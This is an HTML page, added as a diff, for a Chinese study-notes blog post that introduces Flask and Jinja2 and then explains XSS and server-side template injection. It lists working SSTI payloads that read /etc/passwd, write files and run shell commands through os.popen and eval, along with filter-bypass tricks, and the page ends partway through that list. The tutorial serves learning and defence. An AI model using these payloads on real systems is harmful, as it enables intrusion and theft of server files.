@@ -1,0 +1,311 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Flask框架及其漏洞学习 | Seizer</title><meta name="keywords" content="学习笔记"><meta name="author" content="Seizer"><meta name="copyright" content="Seizer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Flask是什么？Flask是一个相对于Django而言轻量级的Web框架，是Python开发的一个基于Werkzeug和Jinja 2的web开发微框架，它的优势是极其简洁，但又非常灵活，而且容易学习和应用。因此Flask框架是Python新手快速开始web开发最好的选择，此外，使用Flask框架的另一个好处在于你可以非常轻松地将基于Python的机器学习算法或数据分析算法集成到web应用中。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flask框架及其漏洞学习">
+<meta property="og:url" content="https://seizer-zyx.github.io/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Seizer">
+<meta property="og:description" content="Flask是什么？Flask是一个相对于Django而言轻量级的Web框架，是Python开发的一个基于Werkzeug和Jinja 2的web开发微框架，它的优势是极其简洁，但又非常灵活，而且容易学习和应用。因此Flask框架是Python新手快速开始web开发最好的选择，此外，使用Flask框架的另一个好处在于你可以非常轻松地将基于Python的机器学习算法或数据分析算法集成到web应用中。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062123578.png">
+<meta property="article:published_time" content="2021-10-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-07T05:57:14.218Z">
+<meta property="article:author" content="Seizer">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062123578.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://seizer-zyx.github.io/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Flask框架及其漏洞学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-07 13:57:14'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/transparent.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Seizer</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Flask框架及其漏洞学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-10-12T16:00:00.000Z" title="undefined 2021-10-13 00:00:00">2021-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Flask框架及其漏洞学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Flask是什么？"><a href="#Flask是什么？" class="headerlink" title="Flask是什么？"></a>Flask是什么？</h1><p>Flask是一个相对于<code>Django</code>而言<em>轻量级</em>的Web框架，是Python开发的一个基于<code>Werkzeug</code>和<code>Jinja 2</code>的web开发微框架，它的优势是极其简洁，但又非常灵活，而且容易学习和应用。因此Flask框架是Python新手快速开始web开发最好的选择，此外，使用Flask框架的另一个好处在于你可以非常轻松地将基于Python的机器学习算法或数据分析算法集成到web应用中。</p>
+<blockquote>
+<p>Django:Python下有许多款不同的 Web 框架。Django是重量级选手中最有代表性的一位。许多成功的网站和APP都基于Django。</p>
+<p>Werkzeug:Werkzeug是Python的<code>WSGI</code>规范的实用函数库。</p>
+<p>WSGI：是为 Python 语言定义的 Web 服务器和 Web 应用程序或框架之间的一种简单而通用的接口。自从 <code>WSGI</code> 被开发出来以后，许多其它语言中也出现了类似接口。我们不希望接触到TCP连接、HTTP原始请求和响应格式，所以，需要一个统一的接口，让我们专心用Python编写Web业务。这个接口就是<code>WSGI</code>：Web Server Gateway Interface。</p>
+<p>Jinja 2:Jinja2是Python下一个被广泛应用的<code>模版引擎</code>，功能比较类似于于PHP的<code>smarty</code></p>
+<p>模板引擎（这里特指用于Web开发的模板引擎 ）：为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p>
+</blockquote>
+<h1 id="Flask基操"><a href="#Flask基操" class="headerlink" title="Flask基操"></a>Flask基操</h1><h2 id="安装Flask"><a href="#安装Flask" class="headerlink" title="安装Flask"></a>安装Flask</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure>
+
+<h2 id="编写Hello-Flask"><a href="#编写Hello-Flask" class="headerlink" title="编写Hello,Flask!"></a>编写Hello,Flask!</h2><ol>
+<li>引入Flask类</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>创建Flask对象，我们将使用该对象进行应用的配置和运行：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure>
+
+<p><code>___name__</code>是Python中的特殊变量，如果文件作为主程序执行，那么<code>__name__</code>变量的值就是<code>__main__</code>，如果是被其他模块引入，那么<code>__name__</code>的值就是模块名称。</p>
+<ol start="3">
+<li>编写主程序</li>
+</ol>
+<p>在主程序中，执行<code>run()</code>来启动应用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>改名启动一个本地服务器，默认情况下其地址是<code>localhost:5000</code>，在上面的代码中，我们使用关键字参数<code>port</code>将监听端口修改为8080。</p>
+<ol start="4">
+<li>路由</li>
+</ol>
+<p>使用app变量的<code>route()</code>装饰器来告诉Flask框架URL如何触发我们的视图函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, Flask!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的标识，对路径’/‘的请求，将转为对<code>hello_world()</code>函数的调用。</p>
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357216.png" alt="image-20210914205338833"></p>
+<h2 id="使用HTML模板"><a href="#使用HTML模板" class="headerlink" title="使用HTML模板"></a>使用HTML模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet</span>():</span></span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ggbond&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;18&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Templating&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        Hello, &lt;b&gt;&#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;username&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;&lt;/b&gt;!, you’re &lt;b&gt;&#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;age&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;&lt;/b&gt; years old.</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357218.png" alt="image-20210914205413958"></p>
+<p>拼接HTML字符串非常容易出错，因此Flask使用Jinja 2模板引擎来分离数据逻辑和展示层。</p>
+<p>使用模板时，视图函数应当返回<code>render_template()</code>的调用结果。例如下面的代码片段渲染模板<code>index.html</code>，并将渲染结果作为视图函数的返回值：</p>
+<p>我们将模板文件按如下路径放置：<br>app.py<br>templates<br>   |-/index.html</p>
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>index.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% if name %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357219.png" alt="image-20210914205507819"></p>
+<h1 id="Flask框架漏洞"><a href="#Flask框架漏洞" class="headerlink" title="Flask框架漏洞"></a>Flask框架漏洞</h1><p>flask使用Jinja作为模板语言，模板应该放在myapp/templates/——一个在应用文件夹里面的目录。Jinja有两种定界符：<code>&#123;% ... %&#125;</code>和<code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行类似循环或赋值的语句，后者向模板输出表达式求值的结果。</p>
+<h2 id="flask导致XSS漏洞"><a href="#flask导致XSS漏洞" class="headerlink" title="flask导致XSS漏洞"></a>flask导致XSS漏洞</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, requestapp = Flask(__name__)@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])<span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span>    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)    html = <span class="string">&#x27;&lt;html&gt;%s&lt;/html&gt;&#x27;</span>    <span class="keyword">return</span> html % codeif __name__ == <span class="string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357220.png" alt="image-20210914205827157"></p>
+<blockquote>
+<p>为了避免XSS，可以使用render_tempplate_string对输入的文本进行渲染。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_stringapp = Flask(__name__)@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])<span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span>    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)    html = <span class="string">&#x27;&lt;html&gt;&#123;&#123;var&#125;&#125;&lt;/html&gt;&#x27;</span>    <span class="keyword">return</span> render_template_string(html, var=code)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357221.png" alt="image-20210914210037860"></p>
+<h2 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h2><blockquote>
+<p>SSTI(Server-Side Template Injection) 服务端模板注入</p>
+<p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分。通过模板，Web应用可以把输入转换成特定的HTML格式。在进行目标编译渲染的过程中，若用户插入了相关恶意内容，结果可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p>
+</blockquote>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul>
+<li>在jinja2中，存在三种语句：控制结构<code> &#123;% %&#125;</code>、变量取值<code> &#123;&#123; &#125;&#125;</code>、注释 <code>&#123;# #&#125;</code>。</li>
+<li>jinja2模板中使用 <code>&#123;&#123; &#125;&#125;</code> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</li>
+<li>在Jinja2引擎中，<code>&#123;&#123;&#125;&#125;</code>不仅仅是<code>变量标示符</code>，也能执行一些简单的<code>表达式</code>。</li>
+<li>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</li>
+</ul>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>将参数当字符串来渲染并且使用了<code>% request.args.get()</code>导致模版渲染可控。如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_stringapp = Flask(__name__)@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])<span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span>    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)    template = <span class="string">&#x27;&lt;html&gt;%s&lt;/html&gt;&#x27;</span> % code    <span class="keyword">return</span> render_template_string(template)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357222.png" alt="image-20210914211657582"></p>
+<p>漏洞代码使用了<code>render_template_string</code>函数，而如果使用<code>render_template</code>函数，将变量传入进去，经过<code>固定模版的渲染</code>便不可控了。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
+<p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p>
+</blockquote>
+<p><strong>利用思路</strong>：找到父类&lt;type ‘object’&gt;–&gt;寻找子类 <strong>subclasses</strong>()–&gt;找关于命令执行或者文件操作的模块</p>
+<blockquote>
+<p>构造继承链的思路是<br>1）随便找一个内置类对象用class拿到他所对应的类<br>2）用bases拿到基类（&lt;class ‘object’&gt;）<br>3）用subclasses()拿到子类列表<br>在子类列表中直接寻找可以利用的类。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、获取’‘的类对象：<span class="string">&#x27;&#x27;</span>.__class__2、追溯继承树：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__3、可以看到<span class="keyword">object</span>已经出来了，然后继续向下查找<span class="keyword">object</span>的子类：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()<span class="number">4</span>、找到可执行命令或者读文件的方法，找到第<span class="number">40</span>个为&lt;type&gt; <span class="string">&#x27;file&#x27;</span>，执行命令：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>常用payload</strong>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3- 文件读取：&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;file&#x27;</span>).read()&#125;&#125;- 命令执行：&#123;&#123; config.<span class="keyword">__class__</span>.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;python2- 文件读取：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;- 文件读取：().\_\_class__.\_\_bases\_\_[<span class="number">0</span>].\_\_subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines- 文件读取：&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  - 写文件：&#123;&#123; <span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/1&#x27;</span>).write(<span class="string">&quot;&quot;</span>) &#125;&#125;- 命令执行：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>- 命令执行：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;code&#x27;</span>)&#125;&#125;  &#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>) &#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2、python3共有，可命令执行：&#123;% <span class="keyword">for</span> c in ().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__(): %&#125;&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;_IterationGuard&#x27;</span>: %&#125;&#123;&#123;c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>一些绕过</strong>：</p>
+<p>（1）过滤[]等括号</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用gititem绕过。如原poc &#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>]&#125;&#125;绕过后&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases.getitem(<span class="number">0</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（2）过滤了subclasses，拼凑法</p>
